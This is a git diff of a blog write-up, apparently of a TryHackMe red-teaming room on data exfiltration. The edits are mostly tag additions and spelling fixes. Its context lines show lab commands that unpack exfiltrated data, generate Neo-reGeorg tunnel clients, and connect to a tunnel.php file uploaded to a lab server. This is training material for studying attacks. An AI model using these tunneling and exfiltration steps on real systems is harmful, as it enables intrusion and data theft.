@@ -2,7 +2,7 @@
 title: Data Exfiltration
 date: 2023-10-20
 categories: [THM, Red Teaming]
-tags: [data-exfiltration, red-teaming]
+tags: [data-exfiltration, red-teaming, ssh, http, http-tunneling, icmp, dns, dns-tunneling]
 img_path: /assets/red-teaming/data-exfiltration
 mermaid: true
 ---
@@ -271,7 +271,7 @@ The above PHP script will handle POST requests via the `file` parameter and stor
     ```shell
     base64 -d /tmp/http.bs64 | tar xvfz -
     ```
-## 5.3 HTTP Tunnelling
+## 5.3 HTTP tunneling
 
 In our network configuration, the `uploader.thm.com` server is reachable from the Internet, but the `app.thm.com` and `flag.thm.com` servers are not. The latter runs locally and provides services only for the internal network.
 
@@ -289,7 +289,7 @@ In our network configuration, the `uploader.thm.com` server is reachable from th
     python3 neoreg.py generate -k thm
     ```
 
-    The above command generates an encrypted tunnelling clients with `thm` as their key under the `neoreg_servers/` directory. Various file extensions are available, but we will use the `tunnel.php` file for this one.
+    The above command generates an encrypted tunneling clients with `thm` as their key under the `neoreg_servers/` directory. Various file extensions are available, but we will use the `tunnel.php` file for this one.
 
     ![tunnel client list](neoreg-servers.png)
 
@@ -297,7 +297,7 @@ In our network configuration, the `uploader.thm.com` server is reachable from th
 
     ![Tunnel Upload](tunnel-upload.jpg)
 
-4. Once the file is uploaded, we will point to it using the `neoreg.py` script in order to connect to the client, providing the key to decrypt the tunnelling client:
+4. Once the file is uploaded, we will point to it using the `neoreg.py` script in order to connect to the client, providing the key to decrypt the tunneling client:
 
     ```shell
     python3 neoreg.py -k thm http://10.10.19.86/uploader/files/tunnel.php
